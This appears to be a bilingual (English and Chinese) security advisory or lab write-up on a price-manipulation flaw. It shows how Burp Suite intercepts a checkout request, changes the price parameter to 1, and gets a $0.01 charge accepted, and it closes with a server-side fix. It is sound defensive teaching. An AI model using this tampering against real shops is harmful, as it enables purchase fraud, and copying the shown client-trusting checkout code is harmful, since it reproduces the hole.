# [SECURITY ADVISORY] Business Logic Vulnerability: Price Manipulation

> 商業邏輯漏洞：透過 Burp Suite 進行價格參數竄改分析

---

# 1. Vulnerability Overview（漏洞概述）

| Item | Details |
|---|---|
| Vulnerability Type | Business Logic Vulnerability / Parameter Tampering |
| Severity | HIGH |
| Affected Component | POST `/cart/checkout` |
| Testing Tool | Burp Suite Community Edition |
| Attack Vector | Manipulated HTTP Request Parameter |

---

# 2. Vulnerability Description（漏洞描述）

## Root Cause（漏洞成因）

系統將商品價格 `price` 由 Client 端傳送至 Server。

由於 Server 未重新驗證商品價格來源，攻擊者可以使用 Burp Suite Proxy 攔截 HTTP Request，修改價格參數後重新送出。

Server 錯誤信任 Client 提供的價格資料，導致攻擊者可以繞過正常價格限制。

---

## Business Impact（商業影響）

攻擊者可能造成：

- 商品價格被任意降低
- 未授權取得商品
- 交易金額錯誤
- 公司財務損失
- 訂單資料完整性受損

---

# 3. Environment（測試環境）

| Item | Value |
|---|---|
| Application | Target Web Application |
| Endpoint | `/cart/checkout` |
| Method | POST |
| Authentication | Required |
| Tool | Burp Suite Proxy |

---

# 4. Steps to Reproduce（漏洞重現步驟）

## Step 1 - Enable Burp Intercept

開啟：

```
Proxy → Intercept
```

確認：

```
Intercept is ON
```

<!-- IMAGE:
放 Burp Proxy Intercept 開啟截圖
-->

---

## Step 2 - Trigger Checkout Request

正常流程：

1. 登入帳號
2. 加入商品至購物車
3. 點擊 Checkout

系統產生：

```
POST /cart/checkout
```

<!-- IMAGE:
放購物車結帳流程截圖
-->

---

## Step 3 - Capture HTTP Request

Burp Proxy 攔截 Request：

```http
POST /cart/checkout HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=xyz123

productId=jacket-101&quantity=1&price=133700
```

<!-- IMAGE:
放 Burp Request 截圖
-->

---

## Step 4 - Modify Parameter

修改：

Before:

```http
price=133700
```

After:

```http
price=1
```

Tampered Request:

```http
POST /cart/checkout HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=xyz123

productId=jacket-101&quantity=1&price=1
```

<!-- IMAGE:
放修改後 Request 截圖
-->

---

## Step 5 - Forward Request

點擊：

```
Forward
```

送出修改後 Request。

<!-- IMAGE:
放 Forward 按鈕截圖
-->

---

# 5. Proof of Concept（漏洞證明）

## Request

```http
POST /cart/checkout HTTP/1.1

productId=jacket-101&quantity=1&price=1
```

---

## Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "orderId": "ORD-88201",
  "totalCharged": "$0.01"
}
```

---

## Evidence（漏洞證據）

Server 接受 Client 修改後的價格：

| Parameter | Original | Modified |
|-|-|-|
| price | 133700 | 1 |

結果：

```
Original Price: $1337.00

Modified Price: $0.01
```

---

# 6. Root Cause Analysis（根因分析）

## Vulnerable Logic

Server 直接使用 Client 提供的價格：

```javascript
const { productId, quantity, price } = req.body;

const totalAmount = price * quantity;
```

問題：

- Client input is trusted
- No server-side validation
- Price source is not controlled

---

# 7. Remediation（修復建議）

## Secure Design Principles

### 1. Never Trust Client Price

不要接受：

```json
{
  "productId": "jacket-101",
  "price": 1
}
```

只接受：

```json
{
  "productId": "jacket-101"
}
```

---

### 2. Use Server-side Price Source

由 Server 查詢資料庫：

```text
Client
 |
 | productId
 ↓
Server
 |
 | Query Database
 ↓
Product Price
```

---

### 3. Calculate Total on Server

Server 自行計算：

```javascript
total = databasePrice * quantity;
```

---

# 8. Secure Code Example（安全程式碼）

```javascript
app.post('/cart/checkout', authMiddleware, async (req, res) => {

  const { productId, quantity } = req.body;

  const product = await db.query(
    'SELECT price FROM products WHERE id = $1',
    [productId]
  );

  if (!product) {
    return res.status(404)
      .json({ error: 'Product not found' });
  }

  const totalAmount = product.price * quantity;

  await processPayment(
    req.user.id,
    totalAmount
  );

  return res.json({
    status: "success",
    totalCharged: totalAmount
  });
});
```

---

# 9. Key Takeaways（重點整理）

- **Client-side parameters can be modified.**  
  Client 端傳送的參數可以被攻擊者修改，不能假設前端資料是可信任的。

- **Never trust price values from users.**  
  永遠不要相信使用者傳入的價格資料，商品價格應由 Server 端控制。

- **Business logic must be validated server-side.**  
  商業邏輯必須在 Server 端進行驗證，例如價格計算、權限檢查、交易流程。

- **Burp Proxy can reveal insecure trust boundaries.**  
  Burp Proxy 可以協助發現 Client 與 Server 之間錯誤的信任邊界，例如 Server 過度相信 Client 提供的資料。
---
